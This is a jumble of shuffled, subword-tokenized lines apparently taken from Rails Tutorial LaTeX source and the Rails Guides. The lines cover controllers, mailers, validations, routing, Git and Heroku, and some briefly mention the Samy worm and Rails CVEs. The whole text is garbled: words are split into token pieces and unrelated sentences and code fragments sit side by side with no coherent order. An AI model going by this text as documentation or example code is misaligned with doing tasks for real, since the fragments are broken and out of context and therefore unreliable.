▁Ju st ▁like ▁controller ▁views , ▁you ▁can ▁also ▁have ▁mailer ▁ layouts ▖
▁belongs _ to ▁: author , ▁class _ name : ▁Blorgh ▖ author _ class ▖ to _ s
▁This ▁is ▁known ▁in ▁the ▁database ▁ business ▁as ▁a ▁\ emph { full - table ▁ s can }, ▁and ▁for ▁a ▁real ▁site ▁with ▁t housand s ▁of ▁users ▁it ▁is ▁a ▁\ href { http :// cat b ▖ org / j argon / html / B / B ad - Thin g ▖ html } { B ad ▁ Thin g } .
▁On ce ▁the ▁\ k ode {@ users } ▁variable ▁is ▁defined , ▁the ▁controller ▁calls ▁the ▁\ emph { view } ▁( Step ~ 6 ), ▁show n ▁in ▁Listing ~\ ref { code : demo _ index _ view } .
▁We ' re ▁already ▁done .
▁In ▁the ▁case ▁of ▁comments ▁and ▁articles , ▁you ▁could ▁write ▁out ▁the ╼ relationships ▁this ▁way :
▁#### ▁javascript _ include _ tag
▁This ▁means ▁starting ▁an ▁ordinar y ▁\ k ode { rails ▁console } ▁session ▁and ▁then ▁creating ▁a ▁user ▁with ▁a ▁valid ▁name ▁and ▁email ▁address ▁together ▁with ▁a ▁valid ▁password ▁and ▁matching ▁confirmation :
▁O d d ly , ▁\ k ode { destroy }, ▁like ▁\ k ode { create }, ▁returns ▁the ▁object ▁in ▁question , ▁though ▁I ▁can ' t ▁recall ▁ever ▁ having ▁used ▁the ▁return ▁value ▁of ▁\ k ode { destroy } .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Users ▁resource ▁in ▁Listing ~\ ref { code : users _ resource } .
▁D ' o h !
▁` PUT ` ▁requests ▁to ▁` / users / : id ` ▁in ▁Rails ▁4 ▁get ▁route d ▁to ▁` update ` ▁as ▁they ▁are ╼ today ▖
▁This ▁works ▁because ▁the ▁user ▁should ▁be ▁ redirected ▁before ▁the ▁application ▁ever ▁ tries ▁to ▁retrieve ▁the ▁relationship ▁with ▁this ~ id .
▁it ▖ ╼╼ ▁\ subsection { D e ve lo p ment ▁environment } ╼ ▁\ label { sec : development _ environment }╼╼
▁You ▁can ▁ bind ▁to ▁the ▁same ▁Ajax ▁events ▁as ▁` form _ for ` ▖
▁This ▁won ' t ▁work ▁for ▁session ▁creation ▁errors ▁because ▁the ▁session ▁isn ' t ▁an ▁Active ▁Record ▁object , ▁so ▁we ' ll ▁render ▁the ▁error ▁as ▁a ▁flash ▁message ▁instead .
▁* ▁How ▁to ▁use ▁Rack ▁ Middleware s ▁in ▁your ▁Rails ▁applications .
▁So ▁the ▁result ing ▁HTTP ▁header ▁for ▁the ▁second ▁example ▁will ▁be ▁the ▁following ▁because ▁the ▁second ▁ Location ▁header ▁field ▁overwrit es ▁the ▁first .
▁$ ▁ echo ▁" + : to _ param + " ▁| ▁ rdoc ▁-- p ip e
▁### ▁S ub classes ▁& ▁De s c end an t s
▁ Pattern s ▁for ▁files ▁that ▁should ▁be ▁ignore d ▁by ▁Git
▁The ▁methods ▁are :
▁Then ▁check ▁to ▁see ▁if ▁your ▁system ▁already ▁has ▁the ▁Heroku ▁command - line ▁client ▁installed :
▁I ▁recommend ▁try ing ▁the ▁new est ▁S ublime ▁Text ▁only ▁if ▁you ▁really ▁want ▁to ▁be ▁on ▁the ▁b le ed ing ▁ ed ge .
▁B oth ▁mailer ▁tests ▁and ▁integration ▁tests ▁are ▁useful ▁for ▁verify ing ▁the ▁behavior ▁of ▁the ▁User ▁mailer .
▁With ▁the ▁latter ▁the ▁first ▁letter ▁becomes ▁lower case :
▁Note ▁that ▁you ▁will ▁see ▁duplicate ▁categories ▁if ▁more ▁than ▁one ▁article ▁has ▁the ▁same ▁ category ▖
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients ▖ id ▁DESC ▁LIMIT ▁3
▁You ▁can ▁also ▁create ▁a ▁job ▁that ▁will ▁run ▁on ▁a ▁specific ▁ queue :
▁invoke ▁ erb
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁after ▁a ▁successful ▁signin ▖ ~\ href { http :// railstutorial ▖ org / images / figures / signin _ success _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁# ▁=> ▁Sun , ▁29 ▁Mar ▁2010
▁* ▁` config ▖ filter _ parameters ` ▁used ▁for ▁filter ing ▁out ▁the ▁parameters ▁that ╼ you ▁don ' t ▁want ▁show n ▁in ▁the ▁log s , ▁such ▁as ▁passwords ▁or ▁ credit ▁ card ╼ number s ▖
▁This ▁is ▁a ▁hand y ▁option ▁if ▁you ▁are ▁updating ▁an ▁old er ▁project ▁that ▁did n ' t ▁use ▁the ╼ asset ▁pipeline ▁and ▁already ▁uses ▁this ▁path ▁or ▁you ▁wish ▁to ▁use ▁this ▁path ▁for ╼ a ▁new ▁resource .
▁create ▁app / assets / stylesheets / users ▖ css ▖ scss
▁In ▁production ▁mode ▁this ▁callback ▁will ▁only ▁run ▁on ▁the ▁first ▁request .
▁in ▁Listing ~\ ref { code : relationships _ controller _ spec _ ajax } .
▁For ▁example , ▁the ▁` config / application ▖ rb ` ▁file ▁includes ▁this ▁setting :
▁### ▁P re process ing
▁In ▁practice , ▁this ▁means ▁two ▁things , ▁depending ▁on ▁what ▁sort ▁of ▁associations ▁you ▁are ▁creating ▖
▁Then ▁run ▁` bundle ` ▁to ▁install ▁the ▁gem .
▁in ▁Listing ~\ ref { code : password _ reset _ mailer _ test } .
▁If ▁you ▁use ▁the ▁cookie ▁session ▁store , ▁this ▁would ▁apply ▁to ▁the ▁` session ` ▁and ╼` flash ` ▁hash ▁as ▁well .
▁def ▁to _ param
▁< td > <%= ▁book ▖ title ▁%></ td >
▁javascript _ path ▁" common " ▁# ▁=> ▁ / assets / common ▖ js
▁It ▁returns ▁an ▁array ▁of ▁strings ▁with ▁all ▁error ▁messages ▁for ▁the ▁given ▁attribute , ▁each ▁string ▁with ▁one ▁error ▁message ▖
▁The ▁ IT U ▁ fe lt ▁it ▁was ▁best ▁to ▁design ate ▁a ▁single ▁ abb r evi ation ▁for ▁use ▁in ▁all ▁languages ▁in ▁order ▁to ▁ mini m ize ▁con f us ion .
▁#### ▁form _ for
▁It ▁uses ▁the ▁same ▁syntax ▁and ▁options ▁as ▁` ActiveRecord :: Base ▖ find ` ▖
▁In ▁general , ▁the ▁work ▁of ▁ configuring ▁Rails ▁means ▁ configuring ▁the ▁ components ▁of ▁Rails , ▁as ▁well ▁as ▁ configuring ▁Rails ▁itself ▖
▁match ▁' / ' ▁=> ▁' root # index '
▁Of ▁course , ▁we ▁could ▁hard - code ▁links ▁like
▁My app :: Application ▖ config ▖ secret _ key _ base ▁= ▁' new ▁secret ▁key ▁base '
▁# ▁=> ▁{" A " =>2}
▁as ▁show n ▁in ▁Listing ~\ ref { code : layout _ login _ logout _ links } .
▁where ( published : ▁true )
▁t ▖ string ▁: account _ number
▁get s ▁run ▁through ▁both ▁CoffeeScript ▁and ▁ ERb ▁( with ▁the ▁code ▁running ▁from ▁right ▁to ▁left , ▁i ▖ e ▖ , ▁CoffeeScript ▁first ) .
▁This ▁is ▁particular ly ▁important ▁if ▁you ▁want ▁to ▁run ▁different ▁versions ▁of ▁Ruby ▁or ▁Rails ▁on ▁the ▁same ▁machine .
▁ http :// www ▖ example ▖ com / account _ activations / q 5 lt 38 h Q D c _ 9 59 P V oo 6 b 7 A / edit
▁The ▁user ▁show ▁page ▁\ href { http :// localhost :3000/ users /1}{/ users /1 } ▁with ▁a ▁ sidebar ▁and ▁CSS ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ show _ sidebar _ css _ bootstrap - full ▖ png }{( full ▁size )}
▁| ▁| ▁40 2 ▁| ▁: p a y ment _ require d ▁|
▁ Specific ally :
▁* ▁A d v ance d ▁technique s ▁such ▁as ▁constraints ▁and ▁Rack ▁end point s .
▁Ou r ▁validations ▁for ▁the ▁\ k ode { name } ▁attribute ▁enforce ▁only ▁minimal ▁constraints --- any ▁non - blank ▁name ▁under ▁ 51 ▁characters ▁will ▁do --- but ▁of ▁course ▁the ▁\ k ode { email } ▁attribute ▁must ▁ satisf y ▁more ▁string ent ▁requirements .
▁### ▁Re strict ing ▁the ▁Route s ▁Create d
▁Rails ▁offer s ▁four ▁standard ▁ s po t s ▁to ▁place ▁initialization ▁code :
▁<%= ▁link _ to ▁" Blog ▁articles ", ▁ blorgh ▖ articles _ path ▁%>
▁#### ▁form _ tag
▁By ▁default ▁these ▁files ▁will ▁be ▁ready ╼ to ▁use ▁by ▁your ▁application ▁immediately ▁using ▁the ▁` require _ tree ` ▁ directive ▖
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ fixture _ reset _ token } .
▁For ▁example , ▁in ▁Section ~\ ref { sec : render ing _ with _ a _ flash _ message } ▁we ' ll ▁use ▁\ k ode { flash [: danger ]} ▁to ▁indicate ▁a ▁failed ▁login ▁attempt
▁The ▁Home ▁page ▁with ▁a ▁working ▁status ▁feed ▖ ~\ href { http :// railstutorial ▖ org / images / figures / home _ page _ with _ feed _ bootstrap - full ▖ png }{( full ▁size )}
▁( GitHub ▁for ▁ Linux ▁is ▁ still ▁just ▁Git , ▁it ▁seem s ▖)
▁# ▁Un comment ▁this ▁line ▁on ▁OS ▁X .
▁# ▁# # ▁ Mo c k ▁ Frame work
▁Rails ▁can ▁maintain ▁state ▁from ▁one ▁page ▁to ▁the ▁next ▁using ▁both ▁temporary ▁and ▁ persistent ▁cookies .
▁Because ▁it ' s ▁a ▁`` magic '' ▁column ▁automatically ▁updated ▁by ▁Rails , ▁setting ▁it ▁by ▁hand ▁isn ' t ▁or dinarily ▁possible , ▁but ▁it ▁is ▁possible ▁in ▁fixtures .
▁Listing ~\ ref { code : layout _ links _ test } ▁uses ▁some ▁of ▁the ▁more ▁advanced ▁options ▁of ▁the ▁\ k ode { assert \_ select } ▁method , ▁seen ▁before ▁in ▁Listing ~\ ref { code : title _ tests } ▁and ▁Listing ~\ ref { code : contact _ page _ test } .
▁#### # ▁` readonly `
▁It ▁would ▁be ▁far ▁better ▁to ▁have ▁a ▁\ emph { feed } ▁of ▁microposts ▁that ▁includes ▁the ▁user ' s ▁own ▁posts , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : proto _ feed _ mockup } .
▁We ▁have ▁to ▁ white list ▁our ▁controller ▁parameters ▁to ▁prevent ▁wrong ful ▁ mass ╼ assignment ▖
▁ ╼ ▁def ▁ foo ╼ ▁do _ stuff ╼ ▁boolean ? ▁?
▁ lib / assets / javascripts / m oo v in at or ▖ js
▁The ▁association ▁between ▁microposts ▁and ▁users .
▁To ▁make ▁some ▁actual ▁microposts , ▁we ▁enter ▁information ▁at ▁the ▁new ▁microposts ▁page , ▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }, ▁as ▁seen ▁in ▁Figure ~\ ref { fig : demo _ new _ micropost } .
▁<%= ▁text _ field ▁: person , ▁: email ▁%>
▁Recall ▁from ▁Section ~\ ref { sec : requiring _ logged _ in _ users } ▁that ▁we ▁enforce d ▁the ▁login ▁requirement ▁using ▁a ▁before ▁filter ▁that ▁called ▁the ▁\ k ode { logged \_ in \_ user } ▁method ▁( Listing ~\ ref { code : authorize _ before _ filter }) .
▁Call ing ▁` p r o t ec t _ from _ forgery ` ▁set s ▁it ▁to ▁`: authenticity _ token ` ▁by ▁default .
▁P lease ▁refer ▁to ▁the ▁` ActiveModel :: Error s ` ▁documentation ▁for ▁a ▁list ▁of ▁all ▁the ▁available ▁methods .
▁Active ▁Record ▁will ▁go ▁through ▁the ▁first ▁element ▁in ▁the ▁conditions ▁value ▁and ▁any ▁ additional ▁elements ▁will ▁replace ▁the ▁question ▁mark s ▁` ( ? ) ` ▁in ▁the ▁first ▁element .
▁subject : ▁email ▖ subject ,
▁#### ▁ Back port ing
▁* ▁` config ▖ assets ▖ logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁` Logger ` ▁class ▖
▁Verify ▁by ▁running ▁the ▁test ▁suite ▁that ▁the ▁ cleaner ▁code ▁in ▁Listing ~\ ref { code : layout _ flash _ content _ tag }, ▁which ▁uses ▁the ▁Rails ▁\ k ode { content \_ tag } ▁helper , ▁also ▁works .
▁ ╼ ▁Contact ▁Ruby ▁on ▁Rails ▁Tutorial ▁about ▁the ▁sample ▁app ▁at ▁the
▁For ▁example , ▁if ▁we ▁want ed ▁it ▁to ▁be ▁` item ` ▁instead ▁of ▁` product ` ▁we ▁would ▁do :
▁# ▁=> ▁ Blog : ▁ Visit .
▁H e ▁is ▁a ▁gra d u ate ▁of ▁\ href { http :// col le ge ▖ h ar var d ▖ ed u /}{ H ar var d ▁Co ll e ge }, ▁has ▁a ▁\ href { http :// re s ol ve r ▖ c al tech ▖ ed u / C al tech E T D : e td - 05 22 200 3- 16 16 2 6 } { P h ▖ D ▖ ▁in ▁P h y s ic s } ▁from ▁\ href { http :// www ▖ c al tech ▖ ed u /}{ C al tech }, ▁and ▁is ▁an ▁ al um n us ▁of ▁the ▁\ href { http :// y com bin at or ▖ com /}{ Y ~ Co mb in at or } ▁ ent re pre ne ur ▁program .
▁d ▁+ ▁1▖ year
▁However , ▁if ▁your ▁changes ▁are ▁complicated ▁or ▁if ▁the ▁code ▁in ▁master ▁has ▁ de via ted ▁significant ly ▁from ▁your ▁ target ▁branch , ▁it ▁m ight ▁require ▁more ▁work ▁on ▁your ▁part ▖
▁Un less ▁the ▁option ▁`: skip _ type s ` ▁exists ▁and ▁is ▁true , ▁an ▁attribute ▁" type " ▁is ▁added ▁as ▁well ▁according ▁to ▁the ▁following ▁m app ing :
▁The ▁third ▁argument ▁is ▁an ▁options ▁hash , ▁in ▁this ▁case ▁adding ▁the ▁CSS ~ id ▁\ k ode { logo } ▁to ▁the ▁sample ▁app ▁link .
▁A ▁ factory ▁to ▁simul ate ▁User ▁model ▁objects .
▁<%= ▁f ▖ submit ▁%>
▁If ▁you ' re ▁ w or ri ed ▁that ▁\ k ode { find \_ by } ▁will ▁be ▁in efficient ▁if ▁there ▁are ▁a ▁large ▁number ▁of ▁users , ▁you ' re ▁a head ▁of ▁the ▁g a me ; ▁we ' ll ▁cover ▁this ▁issue , ▁and ▁its ▁solution ▁via ▁database ▁indices , ▁in ▁Section ~\ ref { sec : uniqueness _ validation } .
▁ /* ▁ ▖ ▖ .
▁ /* ▁ universal ▁* /
▁* ▁modify - README
▁As ▁mentioned ▁above , ▁it ' s ▁also ▁possible ▁to ▁a b and on ▁your ▁topic ▁branch ▁changes , ▁in ▁this ▁case ▁with ▁\ k ode { git ▁branch ▁- D } :
▁ mv ▁< source > ▁< target >
▁C A UT ION : ▁There ▁are ▁many ▁ways ▁to ▁change ▁the ▁state ▁of ▁an ▁object ▁in ▁the ▁database .
▁ ActiveSupport ▖ on _ load (: active _ record ) ▁do
▁It ' s ▁convenient ▁to ▁use ▁the ▁\ k ode { full \_ title } ▁helper ▁in ▁the ▁tests ▁by ▁including ▁the ▁Application ▁helper ▁into ▁the ▁test ▁helper , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ application _ helper } .
▁You ▁can ▁do ▁that ▁with ▁the ▁` find _ or _ create _ by ` ▁and ▁` find _ or _ create _ by !` ▁methods .
▁render ▁' new '
▁The ▁` descendants ` ▁method ▁returns ▁all ▁classes ▁that ▁are ▁`< ` ▁than ▁its ▁receiver :
▁The ╼` ActionMailer :: Message Delivery ` ▁object ▁is ▁just ▁a ▁wrap p er ▁around ▁a ▁` Mail :: Message ` ▖
▁For ▁example , ▁this ▁method ▁from ▁` ActionController :: Http Authentication :: Token :: Controller Methods ` ▁uses ▁` blank ?` ▁for ▁check ing ▁whether ▁a ▁token ▁is ▁present :
▁As ▁you ' ll ▁learn ▁later ▁in ▁this ▁guide , ▁you ╼ can ▁customize ▁this ▁strategy ▁to ▁group ▁files ▁any ▁way ▁you ▁like ▖
▁To ▁require ▁users ▁to ▁be ▁logged ▁in , ▁we ▁define ▁a ▁\ k ode { logged \_ in \_ user } ▁method ▁and ▁invoke ▁it ▁using ▁\ k ode { before \_ action ▁: logged \_ in \_ user }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : authorize _ before _ filter } .
▁These ▁kind s ▁of ▁tests ▁allow ▁us ▁to ▁use ▁ TDD ▁to ▁add ▁new ▁attributes ▁and ▁methods ▁to ▁our ▁User ▁model , ▁and ▁as ▁a ▁ side - e ffect ▁we ▁get ▁a ▁nice ▁specific ation ▁for ▁the ▁methods ▁that ▁all ▁\ k ode { User } ▁objects ▁should ▁respond ▁to .
▁But ▁appearance s ▁are ▁ de ce i v ing : ▁by ▁developing ▁in ▁terms ▁of ▁Rails ▁controllers , ▁actions , ▁and ▁views , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁add ▁arbitrar y ▁amount s ▁of ▁dynamic ▁content ▁to ▁our ▁site .
▁| ▁` { ▁" person " : ▁ null ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁Access ▁control ▁tests ▁for ▁microposts .
▁X ▖ local _ constant s ▁# ▁=> ▁ [: X 1, ▁: X 2, ▁: Y ]
▁There ▁are ▁three ▁tag ▁options ▁available ▁for ▁the ▁` auto _ discover y _ link _ tag `:
▁ u ▁change ▁the ▁email ▁address ▁to ▁one ▁without ▁an ▁ associated ▁Gravatar ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 05 a a 0 f ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁ en a b l ing _ edit s ▁( end )╼╼ ▁% ▁section ▁updating _ users ▁( end )╼╼ ▁\ section { A u th or i z ation } ▁% ▁( fold )╼ ▁\ label { sec : authorization }╼╼
▁ Follow ing ▁the ▁practice ▁from ▁Section ~\ ref { sec : requiring _ signed _ in _ users }, ▁we ' ll ▁put ▁action - level ▁tests ▁of ▁access ▁control ▁in ▁the ▁Users ▁controller ▁test ▁file .
▁At ▁this ▁point , ▁the ▁presence ▁validations ▁are ▁complete , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁The ▁new ▁user ▁page ▁(\ href { http ://0▖0▖0▖0:3000/ users / new }{/ users / new }) .
▁A ▁user ▁profile ▁with ▁an ▁ unfollow ▁button ▁(\ href { http :// localhost :3000/ users /5}{/ users /5}) .
▁A u to ma ted ▁testing ▁allows ▁us ▁to ▁write ▁test ▁suite s ▁that ▁d r ive ▁the ▁development ▁of ▁new ▁features , ▁allow ▁for ▁confident ▁refactoring , ▁and ▁catch ▁re gr ess ion s .
▁* ▁` ActionDispatch :: Callbacks ` ▁run s ▁the ▁ prepare ▁callbacks ▁before ▁ serv ing ▁the ▁request .
▁Such ▁an ▁expression ▁is ▁evaluated ▁in ▁the ▁context ▁of ▁the ▁receiver :
▁Now ▁that ▁you ' ve ▁seen ▁your ▁first ▁Rails ▁application , ▁you ▁should ▁feel ▁free ▁to ╼ update ▁it ▁and ▁ ex pe ri ment ▁on ▁your ▁own ▖
▁* ▁`: domain ` ▁- ▁If ▁you ▁need ▁to ▁specify ▁a ▁H E LO ▁domain , ▁you ▁can ▁do ▁it ▁here .
▁Now ▁it ' s ▁time ▁to ▁get ▁the ▁edit ▁form ▁to ▁work .
▁# ▁In ▁config / initializers / json _ patch ▖ rb :
▁To ▁use ▁a ▁custom ▁local ▁variable ▁name ▁within ▁the ▁partial , ▁specify ▁the ▁`: as ` ▁option ▁in ▁the ▁call ▁to ▁the ▁partial :
▁This ▁tests ▁the ▁standard ▁implementation , ▁but ▁testing ▁the ▁Ajax ▁version ▁is ▁ al most ▁the ▁same , ▁with ▁\ k ode { xhr ▁: post } ▁in ▁place ▁of ▁plain ▁\ k ode { post } :
▁S ince ▁its ▁ de but ▁in ▁200 4 , ▁Ruby ▁on ▁Rails ▁has ▁ rap id ly ▁become ▁one ▁of ▁the ▁most ▁powerful ▁and ▁popular ▁tool s ▁for ▁build ing ▁dynamic ▁web ▁applications .
▁To ▁get ▁started , ▁we ' ll ▁generate ▁an ▁integration ▁test ▁as ▁usual :
▁* ▁`: through `
▁resources ▁: books
▁This ▁guide ▁cover s ▁the ▁user - f ac ing ▁features ▁of ▁Rails ▁routing .
▁If ▁we ▁visit ▁the ▁root ▁URL ▁at ~ / ▁( read ▁`` slash '' , ▁as ▁noted ▁in ▁Section ~\ ref { sec : hello _ world }), ▁we ▁get ▁the ▁same ▁default ▁Rails ▁page ▁show n ▁in ▁Figure ~\ ref { fig : riding _ rails }, ▁but ▁in ▁ generating ▁the ▁Users ▁resource ▁scaffold ing ▁we ▁have ▁also ▁created ▁a ▁large ▁number ▁of ▁pages ▁for ▁ manipulati n g ▁users .
▁Code ▁examples ▁are ▁ o k , ▁too , ▁if ▁needed :
▁== ================
▁would ▁match ▁` books / some / section / last - words - a - me m o ir ` ▁with ▁` params [: section ]` ▁equal s ▁` ' some / section ' `, ▁and ▁` params [: title ]` ▁equal s ▁` ' last - words - a - me m o ir ' ` .
▁In ▁this ▁section , ▁we ' ll ▁add ▁a ▁couple ▁of ▁refinement s ▁to ▁the ▁user / micropost ▁association .
▁Also , ▁the ▁Rails ▁ core ▁team ▁is ▁always ▁interested ▁in ▁feedback ▁from ▁those ▁who ▁can ▁take ▁the ▁time ▁to ▁test ▁ _ ed ge ▁Rails _ ▁( the ▁code ▁for ▁the ▁version ▁of ▁Rails ▁that ▁is ▁current ly ▁under ▁development )▖
▁The ▁`: method ` ▁and ╼` : ' data - con fi rm ' ` ▁options ▁are ▁used ▁as ▁HTML 5 ▁attributes ▁so ▁that ▁when ▁the ▁link ▁is ╼ click ed , ▁Rails ▁will ▁first ▁show ▁a ▁confirm ▁di a log ▁to ▁the ▁user , ▁and ▁then ▁submit ▁the ╼ link ▁with ▁method ▁` delete ` ▖
▁You ▁can ▁support ▁option ▁hashes ▁with ▁default ▁values ▁in ▁a ▁ compact ▁way ▁with ▁this ▁idiom :
▁* ▁`: two _ words _ connect or `: ▁What ▁is ▁used ▁for ▁arrays ▁of ▁length ▁2▖
▁new _ password _ reset _ path
▁The ▁micropost ▁count ▁ assert ion ▁in ▁Listing ~\ ref { code : user _ profile _ test } ▁uses ▁\ k ode { response ▖ body }, ▁which ▁we ▁saw ▁brief ly ▁in ▁the ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset } ▁ exercises ▁( Section ~\ ref { sec : activation _ resets _ exercises }) .
▁Rails ▁can ▁generate ▁Active ▁Mailer ▁actions ▁and ▁views ▁to ▁send ▁email .
▁Re s ul t : ▁two ▁user ▁records ▁with ▁the ▁exact ▁same ▁email ▁address , ▁ de s p ite ▁the ▁uniqueness ▁validation
▁When ▁construct ing ▁data ▁models ▁for ▁web ▁applications , ▁it ▁is ▁essential ▁to ▁be ▁able ▁to ▁make ▁\ emph { associations } ▁between ▁individual ▁models .
▁I ▁prefer ▁to ▁include ▁both ▁steps , ▁though , ▁both ▁for ▁ concept u al ▁c l ar ity ▁and ▁to ▁double - check ▁that ▁the ▁signup ▁form ▁render s ▁without ▁error .
▁It ▁is , ▁to ▁put ▁it ▁mil d ly , ▁very ▁ compact ▁( Listing ~\ ref { code : raw _ user _ model }) .
▁</ tr >
▁Rails ▁also ▁ o we s ▁much ▁of ▁its ▁ success ▁to ▁its ▁ el eg an t ▁and ▁ compact ▁design ; ▁by ▁ exploit ing ▁the ▁m all e ability ▁of ▁the ▁under ly ing ▁\ href { http :// ruby - lang ▖ org /}{ Ruby } ▁language , ▁Rails ▁effective ly ▁creates ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / D o main _ Specific _ Language } { domain - specific ▁language } ▁for ▁writing ▁web ▁applications ▖ ▁As ▁a ▁result , ▁many ▁common ▁web ▁programming ▁task s --- such ▁as ▁ generating ▁HTML , ▁making ▁data ▁models , ▁and ▁routing ▁URLs --- a re ▁easy ▁with ▁Rails , ▁and ▁the ▁result ing ▁application ▁code ▁is ▁con ci se ▁and ▁read able .
▁Parameters
▁ W hether ▁to ▁include ▁the ▁explicit ▁\ k ode { self } ▁is ▁large ly ▁a ▁matter ▁of ▁taste .
▁create ▁test / fixtures / blorgh / comments ▖ yml
▁H ar d ly ▁any ▁email ▁ service ▁or ▁ IS P ▁does ▁enforce ▁case ▁ sensitive ▁email ▁addresses , ▁return ing ▁messages ▁who se ▁re ci p i ent ' s ▁email ▁address ▁was ▁not ▁type d ▁correctly ▁( in ▁all ▁upper ▁case , ▁for ▁example ) .
▁belongs _ to ▁: manager , ▁class _ name : ▁" Employee "
▁git ▁: in it
▁Be side s ▁that , ▁one ▁can ▁use ▁` deep _ symbolize _ keys ` ▁and ▁` deep _ symbolize _ keys !` ▁to ▁ symbolize ▁all ▁the ▁keys ▁in ▁the ▁given ▁hash ▁and ▁all ▁the ▁hashes ▁nested ▁into ▁it ▖
▁This ▁worm ▁automatically ▁sent ▁a ▁f ri end ▁request ▁to ▁ Sam y ▁( the ▁attacker ) ▁simply ▁by ▁visit ing ▁his ▁profile ▖
▁The ▁result ing ▁command ▁to ▁generate ▁the ▁Static ▁Pages ▁controller ▁appears ▁in ▁Listing ~\ ref { code : generating _ pages } .
▁If ▁your ▁application ▁does ▁need ▁to ▁handle ▁custom ▁images ▁or ▁other ▁file ▁upload s , ▁I ▁recommend ▁\ href { https :// github ▖ com / thoughtbot / paper c li p } { P a p er c li p } ▁or ▁\ href { https :// github ▖ com / j nick la s / carrierwave } { CarrierWave } .
▁some _ code
▁def ▁article _ params
▁U s u ally , ▁specify ing ▁the ▁engine ▁inside ▁the ▁Gemfile ▁would ▁be ▁done ▁by ▁specify ing ▁it ╼ as ▁a ▁normal , ▁every day ▁gem .
▁### ▁Pass ing ▁in ▁arguments
▁$ ▁bundle ▁exec ▁rake ▁test : mailers
▁To ▁add ▁the ▁new ▁ webserver , ▁we ▁simply ▁follow ▁the ▁\ href { https :// dev center ▖ heroku ▖ com / articles / deploying - rails - application s - with - the - puma - web - server } { Heroku ▁ Puma ▁documentation } .
▁To ▁get ▁them ▁to ▁pass , ▁we ▁need ▁to ▁use ▁the ▁validation ▁argument ▁to ▁constrain ▁length , ▁which ▁is ▁just ▁\ k ode { length }, ▁along ▁with ▁the ▁\ k ode { maximum } ▁parameter ▁to ▁enforce ▁the ▁upper ▁b ound ▁( Listing ~\ ref { code : length _ validation }) .
▁Fin ally , ▁the ▁author ' s ▁name ▁should ▁be ▁displayed ▁on ▁the ▁article ' s ▁page ▖
▁As ▁a ▁response ▁to ▁that ▁security ▁issue ╼ ( [ CVE - 20 12 - 2 6 60 ]( https :// groups ▖ google ▖ com / forum / # ! search in / rubyonrails - security / deep _ munge / rubyonrails - security / 8 S A - M 3 as 7 A 8 / M r 9 fi 9 X 4 k N g J ), ╼[ CVE - 20 12 - 2 6 9 4 ]( https :// groups ▖ google ▖ com / forum / # ! search in / rubyonrails - security / deep _ munge / rubyonrails - security / j I L Z 34 t A H F 4/ 7 x 0 h L H - o 0 - I J )╼ and ▁[ CVE - 2013 - 0 1 55 ]( https :// groups ▖ google ▖ com / forum / # ! search in / rubyonrails - security / CVE - 20 12 - 2 6 60 / rubyonrails - security / c 7 j T - E e N 9 e I / L 0 u 4 e 87 z Y G M J ) )╼ ` deep _ munge ` ▁method ▁was ▁introduce d ▁as ▁a ▁solution ▁to ▁keep ▁Rails ▁secure ▁by ▁default .
▁Twitter ▁supports ▁direct ▁( private ) ▁m ess a g ing ▁by ▁prefix ing ▁a ▁micropost ▁with ▁the ▁letter ~ ` ` d '' .
▁ trashable ▖ cleanup ( de p th )
▁Cucumber ▁features ▁start ▁with ▁a ▁short ▁ description ▁of ▁the ▁feature , ▁as ▁follows :
▁If ▁you ▁re - submit ▁the ▁form ▁one ▁more ▁time ▁you ' ll ▁now ▁no ▁longer ▁get ▁the ▁missing ╼ template ▁error ▖
▁ mod _ name ▁= ▁path ▖ deconstantize
▁Before ▁your ▁email ▁reach es ▁your ▁Rails ▁app , ▁you ▁would ▁have ▁ha d ▁to ╼ configure ▁your ▁system ▁to ▁some how ▁forward ▁email s ▁to ▁your ▁app , ▁which ▁needs ▁to ▁be ╼ list en ing ▁for ▁that ▖
▁" al ice ▁in ▁won d er l and "▖ title ize ▁# ▁=> ▁" A li ce ▁In ▁ W on d er l and "
▁With ▁this ▁declaration , ▁all ▁of ▁the ▁views ▁rendered ▁by ▁the ▁` Product sController ` ▁will ▁use ▁` app / views / layouts / in ve n to ry ▖ html ▖ erb ` ▁as ▁their ▁layout .
▁Ou r ▁plan ▁in ▁the ▁case ▁of ▁following / followers ▁pages ▁is ▁to ▁check ▁the ▁number ▁is ▁correctly ▁displayed ▁and ▁that ▁links ▁with ▁the ▁right ▁URLs ▁appear ▁on ▁the ▁page .
▁For ▁example , ▁the ▁` admin ▖ css `╼ and ▁` admin ▖ js ` ▁manifest ▁could ▁contain ▁the ▁ JS ▁and ▁CSS ▁files ▁that ▁are ▁used ▁for ▁the ╼ admin ▁section ▁of ▁an ▁application .
▁constraints : ▁ lambda ▁ { ▁| request | ▁ Blacklist ▖ re t ri e ve _ ips ▖ include ?(
▁also ▁shows ▁an ▁alter n ate ▁use ▁of ▁the ▁\ k ode { if } ▁keyword : ▁Ruby ▁allows ▁you ▁to ▁write ▁a ▁statement ▁that ▁is ▁evaluated ▁only ▁if ▁the ▁statement ▁following ▁\ k ode { if } ▁is ▁true .
▁Recall ▁from ▁Section ~\ ref { sec : deleting _ users } ▁that ▁site ▁administrator s ▁have ▁the ▁power ▁to ▁\ emph { destroy } ▁users .
▁# ▁=> ▁100 ▖ 000 %
▁Rails ▁provides ▁a ▁very ▁simple ▁HTTP ▁authentication ▁system ▁that ▁will ▁work ▁nicely ▁in ╼ this ▁situation .
